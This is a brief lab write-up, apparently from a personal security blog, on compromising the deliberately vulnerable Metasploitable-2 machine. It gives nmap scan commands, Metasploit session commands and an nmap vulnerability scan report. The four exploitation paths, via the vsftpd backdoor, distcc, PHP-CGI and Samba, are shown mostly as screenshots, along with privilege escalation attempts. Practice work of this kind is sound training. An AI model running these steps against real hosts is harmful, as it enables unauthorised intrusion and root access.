16.9229L5.31587 18.5H7V20H3.00012L2.99959 18.8786L5.4717 16.035C5.5673 15.9252 5.625 15.7821 5.625 15.625C5.625 15.2798 5.34518 15 5 15C4.67378 15 4.40573 15.2501 4.37747 15.5688L4.3651 15.875H2.875V15.625Z"></path></svg></span><span class="overflow-hidden whitespace-nowrap" style="width:auto;opacity:1">文章目录</span><div class="bg-gradient-shoka-button absolute inset-0 -z-10 rounded-sm" style="will-change:transform"></div></div></div><div class="vertical-scrollbar pt-10 scroll-gutter-stable relative block w-full flex-1 min-h-0 overflow-x-hidden overflow-y-auto md:pt-4 md:pl-3" data-type="post" data-default-type="directory"><div class="sider-slot" data-slot-type="info"><div class="flex flex-col items-center"><div class="h-40 w-40 rounded-full" style="background-image:linear-gradient(135deg, #9e8764 0%, #ae7b62 50%, #644235 100%)"><img class="shadow-card-darker hover:animate-shake h-full w-full rounded-full transition" src="/img/avatar.webp" alt="Kaguya avatar" loading="eager" fetchPriority="high"/></div><p class="mt-2">Kaguya</p><p class="text-muted-foreground mt-3 text-center">ACG / 养猫人 / 菜逼 / 黑客 / 臭美</p><div class="mt-2 grid grid-cols-3 gap-2"><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#191717" data-platform="github" href="https://github.com/kaguyahi" title="GitHub" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="GitHub"><i class="fa-brands fa-github social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#4b9ae4" data-platform="x" href="https://x.com/" title="X (推特)" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="X (推特)"><i class="fa-brands fa-x-twitter social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#55acd5" data-platform="email" href="mailto:2517029339@qq.com" title="Email" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="Email"><i class="fa-regular fa-envelope social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div></div><div class="text-muted-foreground mt-3 flex justify-center text-center text-sm/4 whitespace-nowrap select-none dark:text-white/80"><a href="/blog" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">20</span>文章</a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/categories" aria-label="分类" class="hover:text-blue"><p class="flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">5</span>分类</p></a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/tags" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">20</span>标签</a></div><div class="mt-6 flex w-full flex-col items-center gap-2.5"><a href="/blog" aria-label="文章" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章</a><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a><a href="/blog/archives" aria-label="归档" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-solid fa-flag" aria-hidden="true"></i>归档</a><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-user" aria-hidden="true"></i>关于</a></div></div></div><div class="sider-slot hidden" data-slot-type="directory"><nav class="toc-container max-h-[90dvh] overflow-auto " aria-label="文章目录"><div class="space-y-1 pr-2"><div class="heading-tree-item relative"><a href="#mehod1cve-2007-2447" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Mehod1:CVE-2007-2447"><span class="heading-text block flex-1 truncate leading-relaxed">Mehod1:CVE-2007-2447</span></a></div><div class="heading-tree-item relative"><a href="#method2cve-2011-2523" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Method2:CVE-2011-2523"><span class="heading-text block flex-1 truncate leading-relaxed">Method2:CVE-2011-2523</span></a></div><div class="heading-tree-item relative"><a href="#method3cve-2004-2687" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Method3:CVE-2004-2687"><span class="heading-text block flex-1 truncate leading-relaxed">Method3:CVE-2004-2687</span></a></div><div class="heading-tree-item relative"><a href="#method4cve-2012-1823" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Method4:CVE-2012-1823"><span class="heading-text block flex-1 truncate leading-relaxed">Method4:CVE-2012-1823</span></a></div><div class="heading-tree-item relative"><a href="#enclosure" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Enclosure"><span class="heading-text block flex-1 truncate leading-relaxed">Enclosure</span></a></div></div></nav></div><div class="sider-slot hidden" data-slot-type="series"><div class="flex flex-col gap-1"><a href="/blog/post/20" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">CVE-2020-15778-OpenSSH命令注入漏洞复现</span></a><a href="/blog/post/13" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Kioptrix level 3</span></a><a href="/blog/post/12" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Kioptrix level 2</span></a><a href="/blog/post/10" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Kioptrix level 1</span></a><a href="/blog/post/11" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50 text-primary font-medium"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-primary"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-primary">Metasploitable-2</span></a><a href="/blog/post/9" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Mr-Robot</span></a><a href="/blog/post/8" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">GodenEye</span></a><a href="/blog/post/4" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Metasploitable-1</span></a><a href="/blog/post/3" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Redis未授权访问</span></a></div></div></div><div class="border-border mt-4 flex flex-col gap-3 border-t pt-4 md:mt-0 md:pt-2 w-full px-2"><div class="flex items-center justify-between gap-2"><a href="/blog/post/10" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1" title="Kioptrix level 1"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M10.8284 12.0007L15.7782 16.9504L14.364 18.3646L8 12.0007L14.364 5.63672L15.7782 7.05093L10.8284 12.0007Z"></path></svg><span class="truncate text-xs">Kioptrix level 1</span></a><a href="/blog/post/9" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1 justify-end text-right" title="Mr-Robot"><span class="truncate text-xs">Mr-Robot</span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></a></div><div class="flex justify-center gap-2"><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="回到顶部" aria-label="回到顶部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 10.8284L7.0502 15.7782L5.63599 14.364L11.9999 8L18.3639 14.364L16.9497 15.7782L11.9999 10.8284Z"></path></svg>回到顶部</button><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="滚到底部" aria-label="滚到底部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 13.1714L16.9497 8.22168L18.3639 9.63589L11.9999 15.9999L5.63599 9.63589L7.0502 8.22168L11.9999 13.1714Z"></path></svg>滚到底部</button></div></div><div class="mt-auto w-full rounded-full pt-4 sticky bottom-0"><div class="bg-primary h-1 origin-left rounded-full scale-x-0"></div></div><!--astro:end--></astro-island> </div> <div class="flex min-w-0 grow flex-col gap-8 md:w-full">     <div class="shadow-box bg-gradient-start flex flex-col gap-2 px-10 py-8 tablet:px-6 tablet:pt-6 tablet:pb-2"> <!-- Breadcrumb Navigation --> <nav class="text-muted-foreground flex items-center gap-2 text-sm"> <div class="flex items-center gap-1"> <!-- Home Icon and Link --> <i class="fa-solid fa-house-chimney text-sm" aria-hidden="true"></i> <a href="/blog" aria-label="返回首页"> <span class="hover:text-blue transition-colors duration-300">首页</span> </a> </div> <!-- Category Breadcrumbs -->  <i class="fa-solid fa-angle-right text-muted-foreground/60 text-sm" aria-hidden="true"></i> <a href="/blog/categories/Reproduction" class="hover:text-blue transition-colors duration-300 text-primary bg-primary/10 hover:text-primary hover:bg-primary/20 rounded-full px-2.5 py-1" aria-label="前往Reproduction分类"> Reproduction </a>  </nav> <astro-island uid="Z1IOM8Q" prefix="r4" component-url="/_astro/SummaryPanel.DXjW2U82.js" component-export="SummaryPanel" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;summary&quot;:[0,&quot;Information Gathering The scanning result is as enclosure. Mehod1:CVE-2007-2447 Same as metasploitable-1,method1 Method2:CVE-2011-2523 it&#39;s \&quot;root\&quot; user Method3:CVE-2004-2687 Privilege escalation is as...&quot;],&quot;source&quot;:[0,&quot;auto&quot;],&quot;className&quot;:[0,&quot;mt-2&quot;]}" ssr client="visible" opts="{&quot;name&quot;:&quot;SummaryPanel&quot;,&quot;value&quot;:true}" await-children><div class="overflow-hidden rounded-lg mt-2"><button class="bg-foreground/5 flex w-full cursor-pointer items-center justify-between px-4 py-3 transition-all duration-250 hover:bg-foreground/10 rounded-lg" aria-expanded="false" aria-controls="summary-panel-content"><div class="text-muted-foreground flex items-center gap-1.5 text-sm font-medium"><span class="transition-transform duration-300"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="text-primary size-4" aria-hidden="true"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span>摘要</div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="text-muted-foreground size-4 transition-transform duration-300" aria-hidden="true"><path d="M12 16L6 10H18L12 16Z"></path></svg></button><div id="summary-panel-content" class="grid transition-[grid-template-rows] duration-300 ease-out" style="grid-template-rows:0fr"><div class="overflow-hidden"><div class="bg-foreground/5 text-muted-foreground rounded-b-lg px-4 py-4 text-sm leading-relaxed"><span class="sr-only">Information Gathering The scanning result is as enclosure. Mehod1:CVE-2007-2447 Same as metasploitable-1,method1 Method2:CVE-2011-2523 it&#x27;s &quot;root&quot; user Method3:CVE-2004-2687 Privilege escalation is as...</span><p aria-hidden="true"><span></span></p></div></div></div></div><!--astro:end--></astro-island> <article class="prose md:prose-sm dark:prose-invert"> <div class="custom-content"> <p>Information Gathering</p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>netdiscover -r 192.168.124.0/24</span></span>
<span class="line"><span>sudo nmap -sV -O -Pn -T4 192.168.124.32 -p-</span></span>
<span class="line"><span>nmap --script vuln 192.168.124.32 -p- </span></span></code></pre>
<p>The scanning result is as enclosure.</p>
<hr>
<h1 id="mehod1cve-2007-2447">Mehod1:CVE-2007-2447<a class="anchor-link" href="#mehod1cve-2007-2447"><span class="icon icon-link"></span></a></h1>
<p>Same as metasploitable-1,method1</p>
<hr>
<h1 id="method2cve-2011-2523">Method2:CVE-2011-2523<a class="anchor-link" href="#method2cve-2011-2523"><span class="icon icon-link"></span></a></h1>
<p></p><figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="188" src="/_astro/1675307808514.DT-4e6qk_jJ5FP.webp" ></figure>
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="68" src="/_astro/1675307841182.BhFF66Vv_ZwRvsP.webp" ></figure>
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="135" src="/_astro/1675307847800.DZkVOKuK_1XFF6l.webp" ></figure>
it’s “root” user
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="343" src="/_astro/1675307860348.VQ2YnK5u_2tjU0p.webp" ></figure><p></p>
<hr>
<h1 id="method3cve-2004-2687">Method3:CVE-2004-2687<a class="anchor-link" href="#method3cve-2004-2687"><span class="icon icon-link"></span></a></h1>
<p></p><figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="614" height="148" src="/_astro/1675307882873.7C4TA1U-_Z1DRGS0.webp" ></figure>
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="114" src="/_astro/1675307890322.DgFvBVIV_Z1tidfD.webp" ></figure>
Privilege escalation is as follows
change shell to meterpreter
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="567" height="60" src="/_astro/1675307945242.fV1lm3ic_Z2qQumA.webp" ></figure>
Execute commond as follows:<p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>set sessoin 1</span></span>
<span class="line"><span>exploit </span></span>
<span class="line"><span>sessions -i 2</span></span>
<span class="line"><span>shell</span></span>
<span class="line"><span>upload linux-exploit-suggester</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="90" src="/_astro/1675307951578.jiO8ved1_2sdIfU.webp" ></figure>
Remember add implement privilege to what you upload
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="614" height="540" src="/_astro/1675307968824.CTEzJUHi_V55OF.webp" ></figure>
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="398" height="283" src="/_astro/1675307977375.98G_nsVs_Z1hjRSa.webp" ></figure>
Try to escalate privilege by CVE-2018-14665
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="136" src="/_astro/1675307983061.BsIpu61J_ZcwzVi.webp" ></figure>
Failed,What a pity.
Use the method in previous hub.
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="186" src="/_astro/1675307989107.CJSW-oTl_mST5c.webp" ></figure>
remove the suffix name of the public key,then it’s the private key.
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="381" src="/_astro/1675308017931.CoRz89o__WX4Qh.webp" ></figure><p></p>
<hr>
<h1 id="method4cve-2012-1823">Method4:CVE-2012-1823<a class="anchor-link" href="#method4cve-2012-1823"><span class="icon icon-link"></span></a></h1>
<p></p><figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="346" src="/_astro/1675308052350.BXriGKzM_ZVa99C.webp" ></figure>
<figure class="markdown-image-wrapper"><img  loading="lazy" decoding="async" class="markdown-image" fetchpriority="auto" width="613" height="167" src="/_astro/1675308066038.MKIWkgN8_1XKc4D.webp" ></figure>
Need privilege escalaion again<p></p>
<hr>
<h1 id="enclosure">Enclosure<a class="anchor-link" href="#enclosure"><span class="icon icon-link"></span></a></h1>
<p>┌──(kali㉿kali)-[~]
└─$ nmap —script vuln 192.168.124.32 -p-<br>
Starting Nmap 7.92 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2022-11-03 21:54 EDT
Nmap scan report for bogon (192.168.124.32)
Host is up (0.0020s latency).
Not shown: 65505 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb</a>
|       <a href="http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</a>
|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523</a>
|_      <a href="https://www.securityfocus.com/bid/48539">https://www.securityfocus.com/bid/48539</a>
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
| ssl-poodle:
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the “POODLE” issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       <a href="https://www.securityfocus.com/bid/70574">https://www.securityfocus.com/bid/70574</a>
|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</a>
|       <a href="https://www.imperialviolet.org/2014/10/14/poodle.html">https://www.imperialviolet.org/2014/10/14/poodle.html</a>
|_      <a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">https://www.openssl.org/~bodo/ssl-poodle.pdf</a>
|<em>sslv2-drown: ERROR: Script execution failed (use -d to debug)
| smtp-vuln-cve2010-4344:
|</em>  The SMTP server is not Exim: NOT VULNERABLE
| ssl-dh-params:
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: postfix builtin
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|       <a href="https://www.ietf.org/rfc/rfc2246.txt">https://www.ietf.org/rfc/rfc2246.txt</a>
|<br>
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  BID:74733  CVE:CVE-2015-4000
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</a>
|       <a href="https://www.securityfocus.com/bid/74733">https://www.securityfocus.com/bid/74733</a>
|       <a href="https://weakdh.org">https://weakdh.org</a>
|<br>
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: postfix builtin
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      <a href="https://weakdh.org">https://weakdh.org</a>
53/tcp    open  domain
80/tcp    open  http
| http-enum:
|   /tikiwiki/: Tikiwiki
|   /test/: Test page
|   /phpinfo.php: Possible information file
|   /phpMyAdmin/: phpMyAdmin
|   /doc/: Potentially interesting directory w/ listing on ‘apache/2.2.8 (ubuntu) dav/2’
|   /icons/: Potentially interesting folder w/ directory listing
|_  /index/: Potentially interesting folder
|<em>http-csrf: Couldn’t find any CSRF vulnerabilities.
|<em>http-stored-xss: Couldn’t find any stored XSS vulnerabilities.
|<em>http-phpself-xss: ERROR: Script execution failed (use -d to debug)
|<em>http-trace: TRACE is enabled
|<em>http-dombased-xss: Couldn’t find any DOM based XSS.
|<em>http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
1099/tcp  open  rmiregistry
| rmi-vuln-classloader:
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
|<br>
|     References:
|</em>      <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb</a>
1524/tcp  open  ingreslock
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
3306/tcp  open  mysql
|<em>ssl-ccs-injection: No reply from server (TIMEOUT)
3632/tcp  open  distccd
| distcc-cve2004-2687:
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|<br>
|     Disclosure date: 2002-02-01
|     Extra information:
|<br>
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|<br>
|     References:
|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687</a>
|       <a href="https://nvd.nist.gov/vuln/detail/CVE-2004-2687">https://nvd.nist.gov/vuln/detail/CVE-2004-2687</a>
